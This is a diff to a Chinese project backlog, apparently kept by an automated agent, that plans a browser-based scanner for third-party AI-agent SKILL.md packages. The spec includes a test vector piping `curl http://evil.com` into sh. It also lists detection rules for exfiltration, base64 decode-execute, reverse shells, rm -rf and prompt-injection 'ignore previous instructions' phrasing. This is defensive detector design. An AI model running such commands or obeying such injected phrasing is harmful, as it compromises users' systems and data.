@@ -1,3 +1,101 @@
+## 今日任务（2026-11-02 21:00 · PM 选定轮，接 201 轮通用调研）
+
+**选定：SKILL 安全扫描器（skill_scanner）** — 本轮唯一任务（新工具）。
+
+**顺位**：201 轮 Top3 **递进首席** → **无硬伤递补，不跳过、不二次挑拣**（「无硬伤不跳过、Top3 顺位递进」惯例；201 轮首席；本轮 PM 定序权）。
+
+**PM 独立零重叠实测（163 轮误判教训；本轮实测，ASCII 模式打底）**：
+- `skill_scanner`／`skill-scanner` 在 templates＋static/js＋tools/categories.go＋tests 四处**全 0 命中**；`skill` categories.go 0 命中；`prompt_injection`／`promptinjection` templates 全 0 命中——站内无「第三方 SKILL 包安全扫描」口径工具，**真缺口确凿**。
+- 口径相邻不相同：`forbidden_word_detector`（内容违禁词检测，营销文案合规口径）／`env_sanitizer`（喂 LLM 前给自己的 .env 文本脱敏口径）／`prompt` 提示词优化簇均为不同口径，不构成重叠。
+- 命名无占用：ID `skill_scanner`、Path `/tools/skill-scanner` 均 0 命中；Icon **`phishing` 全库 0 命中**（`security` 已占用 1 次、`bug_report` 已占用 1 次已避开；`shield_moon` 备选同样 0 命中，开发轮精确值复测锁定全库唯一）。
+- 全量 Path **270**（`grep -oE '"/tools/[^"]+"' tools/categories.go | sort -u | wc -l` 实测）；tests/*.test.js **156 个**；本地分支 muse/dev-20260929，HEAD 9749bdd；本轮按铁律 `GIT_SSH_COMMAND="ssh -i /home/hatch/.ssh/id_ed25519 -o StrictHostKeyChecking=no"` 做 `git fetch origin`：**一次成功**，本地 HEAD 9749bdd 与 origin 同头为最新；**本轮仅读操作＋BACKLOG.md 顶部追加，未提交不推送，随开发轮次提交**，沿用研究/PM 轮惯例。
+
+**选定理由**：① **顺位即理由**——201 轮 Top3 首席，无硬伤递补；② **真缺口确凿**——PM 独立实测（本轮）；③ **痛点真实且新鲜**——AI Agent 的 SKILL.md 包满天飞，从 GitHub/论坛装来路不明的 SKILL 包可能含恶意执行、数据外泄、凭据窃取或提示词注入；今日 V2EX t/1253899（KitVerse.dev，2026-11-02）新信号确认此痛点；④ **簇内协同**——与 env_sanitizer／project_to_txt 互链「LLM 安全一条龙」（先扫 SKILL 包、再脱敏自己的文本、再打包喂 LLM）；⑤ **一天可高质量交付**——纯前端小难度，纯函数可写逐字向量（parseSkillFrontmatter frontmatter 解析确定性／scanRiskPatterns 正则风险扫描确定性＋err.field），无模型/外部请求硬伤；⑥ **方向合规**——用户 10-18 方向修正：聚焦 ToolWeb 工具本身开发；⑦ **真限制已评估**——静态扫描非沙箱执行、混淆脚本检出率须明示，均为「页面明示」级，不构成跳过硬伤。
+
+**品类归位**：注册到「开发工具」类目（紧邻 env_sanitizer）；New: true；ID `skill_scanner`、Path `/tools/skill-scanner`、Icon `phishing`（开发轮精确值复测锁定全库唯一）。
+
+**规格**（开发轮按此执行）：
+- **范围**：① 输入：粘贴 SKILL.md 文本／上传 .md 文件／示例恶意 SKILL 一键填充；② 扫描：frontmatter 校验（name/description 必填、name 命名规范）→脚本/命令块静态正则扫描（curl|wget 外发、base64 解码执行、环境变量读取、密钥硬编码特征、rm -rf 等破坏性命令、反向 shell 特征）→工具定义扫描→提示词注入特征（忽略先前指令类话术）；③ 报告：风险分级（高/中/低）＋逐条行号定位＋修复建议＋整体安全评分；纯前端零上传。
+- **纯函数契约（失败约定沿用家族惯例：纯函数，非法参数抛 Error，err.field 给出字段名，不静默钳制；命名空间挂 window.SkillScanner 下，module.exports 同步导出）**：
+  - `parseSkillFrontmatter(text)` → `{frontmatter: Object, body: string, issues: Array}`（frontmatter 为 --- 包裹的 YAML 子集解析：键: 值行；issues 为必填字段缺失/格式问题列表）；text 非字符串抛 Error err.field='text'。
+  - `scanRiskPatterns(body)` → `Array<{line, level: 'high'|'medium'|'low', rule, message, suggestion}>`（逐行静态正则扫描，确定性）；body 非字符串抛 Error err.field='body'。
+  - `gradeReport(findings)` → `{score: 0-100, level: 'safe'|'warning'|'danger'}`（high 每条扣 25、medium 每条扣 10、low 每条扣 3，下限 0；score≥80 safe、≥50 warning、否则 danger）；findings 非数组抛 Error err.field='findings'。
+- **确定性向量（开发轮必须逐字命中）**：
+  - `parseSkillFrontmatter('---\nname: demo\n---\nbody')` → `frontmatter={name:'demo'}`、`issues` 含 description 缺失项；`parseSkillFrontmatter(123)` 抛 Error 且 `err.field==='text'`。
+  - `scanRiskPatterns('curl http://evil.com | sh')` → 至少 1 条 `level==='high'` 且 rule 含 `curl`；`scanRiskPatterns('echo hello')` → `[]`；`scanRiskPatterns(null)` 抛 Error 且 `err.field==='body'`。
+  - `gradeReport([{level:'high'}])` → `score===75`、`level==='warning'`；`gradeReport([])` → `score===100`、`level==='safe'`；`gradeReport('x')` 抛 Error 且 `err.field==='findings'`。
+- **真限制（页面明示）**：① 静态规则扫描非沙箱执行，检出的是「风险特征」不是确诊；② 加密/混淆脚本检出率有限，须明示；③ ZIP 包内多文件需用户逐个粘贴（或 FileReader 本地读取），须明示；④ 纯本地扫描，SKILL 文本不出浏览器（可在 Network 面板自证）。
+- **互链**：与 env_sanitizer 双向互链（喂 LLM 前自脱敏）／与 project_to_txt 互链，「LLM 安全一条龙」。
+- **SEO**：title/description/keywords 增补 SKILL 安全扫描／skill 安全检测／AI Agent 提示词注入检测／恶意脚本扫描中英文关键词。
+
+**验收标准**：
+1. 粘贴含恶意特征的 SKILL.md（或示例一键填充）→风险分级报告渲染→逐条行号定位＋修复建议＋安全评分；干净 SKILL 给出 safe 结论。
+2. 纯函数契约 node 测试全过——新建 `tests/skill_scanner.test.js`（parseSkillFrontmatter／scanRiskPatterns／gradeReport 逐字向量＋err.field），`node tests/skill_scanner.test.js` 直跑。
+3. 真限制四条在页面明示。
+4. 注册：Path 总数 270→**271**；旧测试 Path 断言同步（如有引用 270 的测试文件，开发轮 grep 确认）；Icon `phishing` 全库唯一（开发轮精确值复测锁定）；New: true。
+5. go build/vet 通过；本地 `/tools/skill-scanner` 实测 200；零外部请求。
+
+**预计改动文件**（4 项＋1 确认）：
+1. `templates/skill_scanner.html`（新建：SKILL 输入/上传/示例＋扫描报告＋真限制＋SEO）
+2. `static/js/skill_scanner.js`（新建：parseSkillFrontmatter／scanRiskPatterns／gradeReport 纯函数＋报告渲染 UI 绑定，挂 window.SkillScanner，module.exports 同步导出）
+3. `tests/skill_scanner.test.js`（新建：确定性向量逐字＋err.field；零依赖直跑）
+4. `tools/categories.go`（新增注册项：ID skill_scanner、Path /tools/skill-scanner、Icon phishing、Category 开发工具（紧邻 env_sanitizer）、New: true、Description 含中英文关键词）
+5. 旧测试 Path 断言同步（开发轮 grep 确认是否有引用 270 的测试文件）
+
+**顺位递补**（PM 裁定）：RAG 文本分块预览器 → 留池 P2（201 轮第二顺位；`chunk` templates 全 0 命中真缺口；V2EX t/1253899 RAG Chunking Playground 同帖新信号；本轮顺位未到，不提前）／屏幕尺子 → **维持暂不立项**（17:00 PM 轮裁定；本轮无新信号变化；低优先观察保持，PM 保留复活裁定权）。
+
+**PM 备注**：本轮仅读操作＋BACKLOG.md 顶部追加，未提交不推送，随开发轮次提交，沿用研究/PM 轮惯例；铁律重申：只在 muse/dev-20260929 工作、提交、推送，不碰 master，不 force-push；部署授权仅限 /tool-web 经 ~/workspace/deploy/toolweb/deploy.sh。
+
+**交付核对**：本地当前分支 muse/dev-20260929（本轮按铁律 `GIT_SSH_COMMAND="ssh -i /home/hatch/.ssh/id_ed25519 -o StrictHostKeyChecking=no"` 做 `git fetch origin`：**一次成功**，本地 HEAD 9749bdd 与 origin 同头为最新，远端无新提交）；`grep -oE '"/tools/[^"]+"' tools/categories.go | sort -u | wc -l` = **270**；tests/*.test.js **156 个**；PM 独立零重叠实测：`skill_scanner`／`skill-scanner` 四处全 **0 命中**；`skill` categories.go **0 命中**；`prompt_injection`／`promptinjection` templates 全 **0 命中**；口径相邻不相同确认：forbidden_word_detector（内容违禁词口径）／env_sanitizer（喂 LLM 前自脱敏口径）均为不同口径；Icon `phishing` 全库 **0 命中**（`security` 占用 1 次、`bug_report` 占用 1 次已避开；`shield_moon` 备选同样 0 命中）；简繁互转仍开发中（templates/jianfan_converter.html 不存在，git head 9749bdd），移出候选池；铁律重申：只在 muse/dev-20260929 工作、提交、推送，不碰 master，不 force-push；部署授权仅限 /tool-web 经 ~/workspace/deploy/toolweb/deploy.sh。
+
+---
+
+## 今日任务（2026-11-02 21:00 · 通用调研第二百〇一轮，接 19:39 开发轮）
+
+**交付状态**：11-02 通用调研第二百〇一轮（WPS 特别方向 10-09~10-15 已结束；用户方向修正 2026-10-18 持续有效：聚焦 ToolWeb 工具本身开发，不扩展泛财务／生活计算器）。**JSON 转 Excel 交付闭环**（9749bdd 新增：json_to_excel，Path 269→270，node 90 断言全过、全量 156 测试文件全绿；go build/vet 通过，本地 /tools/json-to-excel 实测 200，端到端 xlsx 回读行列对齐，零外部请求；「表格一条龙」互链闭环；候选池划出）。**网名生成器／打字练习工具** 19:30 PM 轮裁定**维持暂不立项**（低优先观察保持）；**屏幕尺子** 17:00 PM 轮裁定**暂不立项维持**（低优先观察保持）。**简繁互转仍开发中**（templates/jianfan_converter.html 不存在，git head 9749bdd；categories.go jianfan 0 命中），继续标记「开发中」移出 Top3。**Top3 递进链已清空**（首席已交付、第二三顺位 PM 裁定暂不立项），本轮以新信号重建 Top3：SKILL 安全扫描器→首席／RAG 文本分块预览器→第二顺位／屏幕尺子→第三顺位备选（PM 裁定暂不立项维持，真缺口确凿，PM 可复活）。本轮只做新信号挖掘与候选池维护，不动排期定序（定序权归 PM 决策轮）；21:00 轮，优先小难度纯前端。
+
+**本轮三件事**（21:00 全网调研，通用方向）：
+1. 交付确认：git log 头部 9749bdd（JSON 转 Excel 新增，node 90 断言全过，全量 156 个 node 测试文件全绿）／9b48c03（device_check 新增）／567f6d2（readability_analyzer 新增）；`grep -oE '"/tools/[^"]+"' tools/categories.go | sort -u | wc -l` 实测 **270**；`ls templates/json_to_excel.html static/js/json_to_excel.js tests/json_to_excel.test.js` **均存在**；`ls templates/jianfan_converter.html` 不存在（简繁互转开发中，categories.go jianfan 0 命中）；本地分支 muse/dev-20260929（本轮按铁律 `GIT_SSH_COMMAND="ssh -i /home/hatch/.ssh/id_ed25519 -o StrictHostKeyChecking=no"` 做 `git fetch origin`：**一次成功**，本地 HEAD 9749bdd 与 origin 同头为最新；仅做读操作＋BACKLOG.md 顶部追加，未提交不推送，随 PM／开发轮次提交，沿用研究轮惯例）。
+2. **零重叠复核（163 轮误判教训；ASCII 模式打底；CJK 检索词 python `chr(0x...)` 运行时构造＋命中行 codepoint 解码验真，已记入 AGENTS.md）**：
+   - JSON 转 Excel：已交付（9749bdd，Path 269→270）——划出候选池。
+   - 网名生成器／打字练习工具：19:30 PM 轮裁定维持暂不立项——移出 Top3，低优先观察保持。
+   - 屏幕尺子：17:00 PM 轮裁定暂不立项维持——移出 Top3 递进链，第三顺位备选保留，低优先观察保持。
+   - 简繁互转：仍开发中——移出 Top3。
+   - **SKILL 安全扫描器**（V2EX t/1253899 KitVerse.dev，2026-11-02 新信号）：`skill` ASCII 复核 categories.go 0 命中；`prompt_injection`／`promptinjection` templates 全 0 命中——**真缺口确凿**（相邻口径不相同：`forbidden_word_detector` 为「内容违禁词检测」口径；`env_sanitizer` 为「喂 LLM 前给自己的文本脱敏」口径，均与「扫描第三方 SKILL 包的恶意执行/提示词注入」口径不同）。
+   - **RAG 文本分块预览器**（V2EX t/1253899 RAG Chunking Playground，新信号）：`chunk` templates 全 0 命中；分块 CJK python 运行时构造＋codepoint 解码验真，唯一命中 pdf_to_ppt.html（PPT 转换内口径，不同）——**真缺口确凿**（相邻口径不相同：`ai_token_counter` 为「整段文本 token 计数」口径，无分块策略预览；`project_to_txt` 为「打包喂 LLM」口径，不同）。
+   - Markdown→思维导图 Markmap（dev.to Q1 2026 榜单信号）：templates/**mind_map.html** 已交付（另思维导图 CJK 全站唯一命中即 mind_map）——**已交付，确认消解**，不立项。
+   - EXIF 隐私查看/清除（V2EX t/1252552 tubox 信号，2026-10-28）：templates/**exif_strip.html** 已交付——**已交付，确认消解**，不立项。
+   - Tokenizer 可视化（KitVerse Tokenizer Playground 信号）：templates/**ai_token_counter.html** 已交付（「整段 token 计数」口径；跨模型 token 切分可视化属扩展口径，低优先观察，不独立立项）。
+   - AI 抠图/AI 放大（tubox 信号）：ONNX 硬伤观察保持——确认消解。
+3. 新信号扫描（V2EX＋dev.to＋HN＋中文需求搜索为本轮主线）：**新立项候选 2 项**（SKILL 安全扫描器、RAG 文本分块预览器，均为真缺口纯前端小难度），其余全部确认消解——
+   - V2EX：**t/1253899 KitVerse.dev「为 AI 建设者打造免费工具箱」（2026-11-02，13 小时前）**→ **SKILL 安全扫描器新候选**（痛点：Agent Skill 包满天飞，装来路不明的 SKILL.md 有恶意执行/数据外泄/凭据窃取/提示词注入风险；同帖 RAG Chunking Playground→**RAG 文本分块预览器新候选**；同帖 API 实验台→需发真实网络请求＋CORS 硬伤，确认消解；同帖「PUA AI 生成器」→娱乐口径，确认消解；同帖 Tokenizer Playground→站内 ai_token_counter 已交付确认消解；同帖 RAG Chunking Playground 之「真实 token 计数」部分可降级为本地估算，纯前端可做）／**t/1252552 tubox 免登录图片工具箱**（10-28；批量压缩/改尺寸/格式转换/水印→站内均已交付确认消解；AI 抠图/2x放大→ONNX 硬伤观察保持；**EXIF 隐私查看/无损清除→站内 exif_strip 已交付确认消解**）／t/1252493 xGoose AI Agent 插件（198 轮已复核；浏览器插件口径，确认消解）；
+   - dev.to：**Q1 2026 browser-only tools**（Markmap→站内 mind_map 已交付确认消解；RAWGraphs→30+ 图表重型产品口径，确认消解；Datasette Lite→WASM 全量 SQLite 硬伤，确认消解；Wormhole→需外部服务/信令，确认消解；tmp.tf→需跨设备同步后端，确认消解）／hysenlabs 35 工具（199 轮已复核；全站内已交付确认消解）／「8 free devtools」（200 轮已复核，trace-context-validator 弱观察低优先保持）；
+   - HN：**HackerTube**（Karpathy，11-01；需 YouTube 数据/API 数据产品口径，确认消解）／**Wikihack**（HN 维基文章流；需外部爬取数据，确认消解）／OmniDiff（Rust 桌面 diff 工具口径，确认消解）／「Brazilian Court Prompt Injection」（法律新闻口径，确认消解）；
+   - 中文需求搜索：「希望有一个网站能」→SEO 垃圾站（xiaolikt/syour 建站营销文），无可用信号；91yun AI 大全（AI 服务口径，确认消解）。
+
+**推荐 Top3**（排期建议；尊重 PM 定序；「无硬伤不跳过、Top3 顺位递进」惯例；简繁互转开发中移出候选池）：
+1. **SKILL 安全扫描器** — 递进首席（**今日 V2EX t/1253899 新信号**（2026-11-02，13 小时前）：KitVerse.dev「SKILL 安全扫描」——AI Agent Skill 包爆发期，装来路不明的 SKILL.md 有恶意执行/数据外泄/凭据窃取/提示词注入风险；站内真缺口确凿：`skill` categories.go 0 命中，`prompt_injection` templates 全 0 命中；forbidden_word_detector／env_sanitizer 均为不同口径；痛点：从 GitHub/论坛随便装一个 SKILL.md 或 skill zip，不知道里面有没有偷数据的脚本；实现：粘贴 SKILL.md 文本（或拖入 .md/.zip 列表）→静态规则扫描：frontmatter 必填字段校验（name/description）→脚本/命令块正则（curl|wget 外发、base64 解码执行、环境变量读取、密钥硬编码、rm -rf、反向 shell 特征）→工具定义扫描→风险分级报告（高/中/低＋逐条定位行号＋修复建议）；纯前端小难度（纯函数可写逐字向量：parseSkillFrontmatter／scanRiskPatterns 确定性＋err.field；复用站内 env_sanitizer 的密钥正则思路）；与 env_sanitizer／project_to_txt 互链「LLM 安全一条龙」；真限制：静态扫描非沙箱执行、加密/混淆脚本检出率须明示、ZIP 包内文件需用户逐个粘贴（或 FileReader 本地解包）须明示；Icon 待开发轮精确值复测锁定全库唯一）。
+2. **RAG 文本分块预览器** — 第二顺位（**今日 V2EX t/1253899 新信号**：KitVerse.dev「RAG Chunking Playground（6 种分块策略预览，带真实 token 计数和偏移量）」；站内真缺口确凿：`chunk` templates 全 0 命中，分块 CJK 唯一命中 pdf_to_ppt 不同口径；ai_token_counter 仅整段计数无分块预览；痛点：做 RAG/喂 LLM 前不知道长文本会被切成几块、每块多少 token、会不会把句子拦腰截断；实现：粘贴长文本→分块策略可选（固定字符数／按段落／按句子／递归分隔符）＋块大小/重叠度可调→分块结果列表（每块字符数/预估 token/起止偏移）→块边界高亮预览→导出 JSON；纯前端小难度（纯函数可写逐字向量：chunkByChars／chunkByParagraph／chunkBySentence 确定性＋err.field；token 估算沿用站内 ai_token_counter 口径）；与 ai_token_counter／project_to_txt 互链「LLM 预处理一条龙」；真限制：token 为本地估算非各模型精确值、中文分句启发式须明示；Icon 待开发轮精确值复测锁定全库唯一）。
+3. **屏幕尺子** — 第三顺位备选（199 轮 Top3 第三顺位；**17:00 PM 轮裁定暂不立项维持**，本轮无新信号变化；站内真缺口确凿：`screen_ruler` ASCII 三处 0 命中；痛点：前端还原设计稿/量网页元素间距想快速量像素距离，桌面量尺软件要安装；实现：全屏 overlay 十字尺＋拖拽量取两点像素距离＋放大镜局部放大＋快捷键；纯前端小难度（纯函数可写逐字向量：calcDistance／pxToUnit 确定性＋err.field）；真限制：CSS 像素非物理尺寸、高 DPR 换算须明示；**低优先说明：设计/前端小众口径，PM 可裁定维持暂不立项或复活**；Icon 待开发轮精确值复测锁定全库唯一）。
+
+其余观察项保持原状：网名生成器（19:30 PM 轮裁定维持暂不立项，低优先观察保持）／打字练习工具（19:30 PM 轮裁定维持暂不立项，低优先观察保持）／简繁互转（开发中，移出 Top3）／Tokenizer 跨模型切分可视化（本轮新弱观察：站内 ai_token_counter 已交付计数口径，tiktoken WASM 体积硬伤，低优先）／一键人脸模糊（HN BlurFaces 信号；人脸检测模型硬伤，低优先观察保持）／Tap Tempo BPM 测速器（09:00 PM 轮已裁定暂不立项，低优先观察保持）／trace-context-validator（200 轮弱观察，低优先）／跑步配速计算器（56 轮／160 轮按 10-18 方向修正裁定不立项，观察记账）／网页钢琴（56 轮／10-30 轮裁定非工具口径消解）／Wordle 求解器（游戏口径低优先观察）／看房评分卡（租房口径弱观察）／搬家照片配对报告（10-30 轮观察项，低优先保持）／ReqForge 式 HTTP 请求→多语言代码片段生成器（185 轮弱观察，低优先；站内已有 curl_to_requests 单语言版，独立立项价值待 PM 裁定）／OFD 转 PDF（排版引擎硬伤，低优先）／TTS 文字转语音文件导出（speechSynthesis 硬伤，低优先）／高精度计算器 BigNumber（方向修正口径风险，低优先保持）／字体搭配预览器（外部 webfont 请求与零外部请求惯例冲突，口径待 PM 裁定，观察保持）／AI 图片超分（ONNX 硬伤，低优先）／一键图片去背景（ONNX 硬伤，低优先）／社媒图片尺寸生成器（169 轮 PM 裁定「暂不立项」）／视频转码/压缩器（ffmpeg.wasm ~30MB 硬伤，低优先）／P2P 文件传输器（WebRTC 信令硬伤）／HEIC（硬伤未解）／数独求解器（游戏口径无信号，低优先保持）／新拟态生成器／CSS 脉冲动画生成器（143 轮）；在线电台收听器（88 轮；硬伤未解继续跳过）；robots.txt 校验器（198 轮弱观察，低优先）；密码工具 passphrase 模式＋破解时间估算扩展（199 轮 ToolPry 信号；站内密码生成器已交付，扩展口径观察，不独立立项）；Markdown 幻灯片（199 轮弱观察：真缺口但中难度、无新鲜外部信号，低优先）；其余 92 轮及之前留池项均保持留池／观察原状。
+
+**通用候选表增量**（第二百〇一轮：JSON 转 Excel 交付闭环（9749bdd 新增，node 90 断言全过，全量 156 测试文件全绿；go build/vet 通过，本地 /tools/json-to-excel 实测 200，端到端 xlsx 回读行列对齐；Path 269→270；候选池划出）；网名生成器／打字练习工具 19:30 PM 轮裁定维持暂不立项（低优先观察保持）；屏幕尺子 17:00 PM 轮裁定暂不立项维持（低优先观察保持；本轮第三顺位备选）；简繁互转仍开发中（templates/jianfan_converter.html 不存在，git head 9749bdd；categories.go jianfan 0 命中），继续标记「开发中」移出 Top3；**Top3 递进链重建**：**SKILL 安全扫描器→递进首席**（V2EX t/1253899 2026-11-02 新信号；`skill` categories.go 0 命中、`prompt_injection` templates 全 0 命中真缺口；forbidden_word_detector／env_sanitizer 口径不同；纯前端小难度；「LLM 安全一条龙」互链）／**RAG 文本分块预览器→第二顺位**（同帖 RAG Chunking Playground 新信号；`chunk` templates 全 0 命中真缺口；ai_token_counter 仅整段计数无分块；纯前端小难度；「LLM 预处理一条龙」互链）／**屏幕尺子→第三顺位备选**（`screen_ruler` 三处 0 命中真缺口；本轮无新信号变化；PM 可裁定维持暂不立项或复活）；**本轮初判候选消解 4 项**：Markdown→思维导图→站内 mind_map 已交付／EXIF 隐私查看清除→站内 exif_strip 已交付／Tokenizer 可视化→站内 ai_token_counter 已交付（扩展口径低优先观察）／AI 抠图放大→ONNX 硬伤观察保持；新信号扫描：V2EX（**t/1253899 KitVerse.dev→2 新候选**／t/1252552 tubox→已交付/硬伤确认消解／t/1252493 xGoose 198 轮已复核）＋dev.to（Q1 2026 browser-only→Markmap/RAWGraphs/Datasette/Wormhole/tmp.tf 确认消解；hysenlabs 35 工具 199 轮已复核；「8 free devtools」200 轮已复核）＋HN（HackerTube 数据产品／Wikihack 外部数据／OmniDiff 桌面口径均消解）＋中文需求搜索（SEO 垃圾站无可用信号）；本轮 fetch 一次成功，本地 HEAD 9749bdd 与 origin 同头为最新；铁律重申：只在 muse/dev-20260929 工作、提交、推送，不碰 master，不 force-push；部署授权仅限 /tool-web 经 ~/workspace/deploy/toolweb/deploy.sh）：
+
+| 标题 | 痛点 | 难度 | 优先级 |
+|---|---|---|---|
+| JSON 转 Excel | 已交付划出（9749bdd 新增：json_to_excel，Path 269→270，node 90 断言全过，全量 156 测试文件全绿；go build/vet 通过，本地 /tools/json-to-excel 实测 200，端到端 xlsx 回读行列对齐，零外部请求；候选池划出） | — | 已实现 |
+| 简繁互转 | 仍开发中（templates/jianfan_converter.html 不存在，git head 9749bdd；categories.go jianfan 0 命中；未确认交付前不划出候选池，本轮标记「开发中」移出 Top3） | 小 | 开发中 |
+| SKILL 安全扫描器 | 递进首席（V2EX t/1253899 KitVerse.dev 2026-11-02 新信号：Agent Skill 包爆发期，装来路不明的 SKILL.md 有恶意执行/数据外泄/凭据窃取/提示词注入风险；站内零重叠实测：`skill` categories.go 0 命中、`prompt_injection` templates 全 0 命中真缺口；forbidden_word_detector（内容违禁词）／env_sanitizer（喂 LLM 前自脱敏）均为不同口径；痛点：GitHub/论坛随便装的 SKILL.md 不知道有没有偷数据脚本；实现：粘贴 SKILL.md→frontmatter 必填字段校验→脚本/命令块静态正则（curl|wget 外发、base64 解码执行、环境变量读取、密钥硬编码、rm -rf、反向 shell 特征）→风险分级报告（高/中/低＋行号定位＋修复建议）；纯前端小难度（纯函数可写逐字向量：parseSkillFrontmatter／scanRiskPatterns 确定性＋err.field；复用 env_sanitizer 密钥正则思路）；与 env_sanitizer／project_to_txt 互链「LLM 安全一条龙」；真限制：静态扫描非沙箱执行、混淆脚本检出率须明示；Icon 待开发轮精确值复测锁定全库唯一） | 小 | P1 |
+| RAG 文本分块预览器 | 第二顺位（V2EX t/1253899 同帖 RAG Chunking Playground 新信号；站内零重叠实测：`chunk` templates 全 0 命中，分块 CJK 唯一命中 pdf_to_ppt 不同口径，真缺口确凿；ai_token_counter 仅整段计数无分块预览；痛点：做 RAG/喂 LLM 前不知道长文本被切几块、每块多少 token、句子会不会拦腰截断；实现：粘贴长文本→分块策略（固定字符数／按段落／按句子／递归分隔符）＋块大小/重叠可调→分块列表（字符数/预估 token/起止偏移）＋块边界高亮→导出 JSON；纯前端小难度（纯函数可写逐字向量：chunkByChars／chunkByParagraph／chunkBySentence 确定性＋err.field；token 估算沿用 ai_token_counter 口径）；与 ai_token_counter／project_to_txt 互链「LLM 预处理一条龙」；真限制：token 本地估算非各模型精确值、中文分句启发式须明示；Icon 待开发轮精确值复测锁定全库唯一） | 小 | P2 |
+| 屏幕尺子 | 第三顺位备选（199 轮 Top3 第三顺位；17:00 PM 轮裁定暂不立项维持，本轮无新信号变化；screen_ruler ASCII 三处 0 命中真缺口；痛点：前端还原设计稿/量网页元素间距想快速量像素距离，桌面量尺软件要安装；实现：全屏 overlay 十字尺＋拖拽量取两点像素距离＋放大镜局部放大＋快捷键；纯前端小难度；真限制：CSS 像素非物理尺寸、高 DPR 换算须明示；低优先：设计/前端小众口径，PM 可裁定维持暂不立项或复活） | 小 | P2（留池） |
+
+**归档说明**：本轮为 11-02 通用调研第二百〇一轮——JSON 转 Excel 交付闭环（9749bdd；`/tools/json-to-excel` 已注册；旧测试 Path 断言 269→270 同步；全量 156 个 node 测试文件全绿；候选池划出），全量 **270 Path**；网名生成器／打字练习工具 19:30 PM 轮裁定维持暂不立项（低优先观察保持）；屏幕尺子 17:00 PM 轮裁定暂不立项维持（低优先观察保持）；简繁互转仍开发中（templates/jianfan_converter.html 不存在，git head 9749bdd），继续标记「开发中」移出 Top3；**Top3 递进链重建**：SKILL 安全扫描器→递进首席（V2EX t/1253899 2026-11-02 新信号；`skill`／`prompt_injection` 全 0 命中真缺口；纯前端小难度；「LLM 安全一条龙」）／RAG 文本分块预览器→第二顺位（同帖新信号；`chunk` 全 0 命中真缺口；纯前端小难度；「LLM 预处理一条龙」）／屏幕尺子→第三顺位备选（`screen_ruler` 三处 0 命中真缺口；PM 17:00 裁定暂不立项维持，本轮无新信号变化）；本轮初判 4 项全部确认消解（mind_map／exif_strip／ai_token_counter 已交付；AI 抠图放大 ONNX 硬伤观察保持）；本轮 fetch 一次成功，本地 HEAD 9749bdd 与 origin 同头为最新；新信号扫描：V2EX＋dev.to＋HN＋中文需求搜索（详见上文）；铁律重申：只在 muse/dev-20260929 工作、提交、推送，不碰 master，不 force-push；部署授权仅限 /tool-web 经 ~/workspace/deploy/toolweb/deploy.sh。
+
+**交付核对**：本地当前分支 muse/dev-20260929（本轮按铁律 `GIT_SSH_COMMAND="ssh -i /home/hatch/.ssh/id_ed25519 -o StrictHostKeyChecking=no"` 做 `git fetch origin`：**一次成功**，本地 HEAD 9749bdd 与 origin 同头为最新；仅做读操作＋BACKLOG.md 顶部追加，未提交不推送，随 PM／开发轮次提交，沿用研究轮惯例）；git log 头部 9749bdd（json_to_excel 新增，node 90 断言全过，全量 156 个 node 测试文件全绿）／9b48c03（device_check 新增）／567f6d2（readability_analyzer 新增）；`grep -oE '"/tools/[^"]+"' tools/categories.go | sort -u | wc -l` = **270**；`ls templates/json_to_excel.html static/js/json_to_excel.js tests/json_to_excel.test.js` **均存在**；`ls templates/jianfan_converter.html` **不存在**（简繁互转开发中，categories.go jianfan 0 命中）；Top3 候选重叠复核（**JSON 转 Excel**：已交付（/tools/json-to-excel，Path 269→270），划出候选池；**简繁互转**：仍开发中，移出 Top3；**SKILL 安全扫描器**：`skill` categories.go 0 命中；`prompt_injection`／`promptinjection` templates 全 0 命中；forbidden_word_detector（内容违禁词）／env_sanitizer（喂 LLM 前自脱敏）口径不同；真缺口确凿；**RAG 文本分块预览器**：`chunk` templates 全 0 命中；分块 CJK python 运行时构造＋codepoint 解码验真唯一命中 pdf_to_ppt（PPT 转换口径不同）；ai_token_counter 仅整段计数；真缺口确凿；**屏幕尺子**：`screen_ruler` ASCII 三处 0 命中；真缺口确凿（17:00 PM 轮裁定暂不立项维持）；**Markdown→思维导图／EXIF 隐私查看／Tokenizer**：初判后复核均已交付确认消解）；铁律重申：只在 muse/dev-20260929 工作、提交、推送，不碰 master，不 force-push；部署授权仅限 /tool-web 经 ~/workspace/deploy/toolweb/deploy.sh。
+
+---
+
 ## 开发轮交付记录（2026-11-02 19:39 · 前端开发）
 
 **交付：JSON 转 Excel（json_to_excel）** — 本轮唯一任务，开发完成并推送到 muse/dev-20260929。
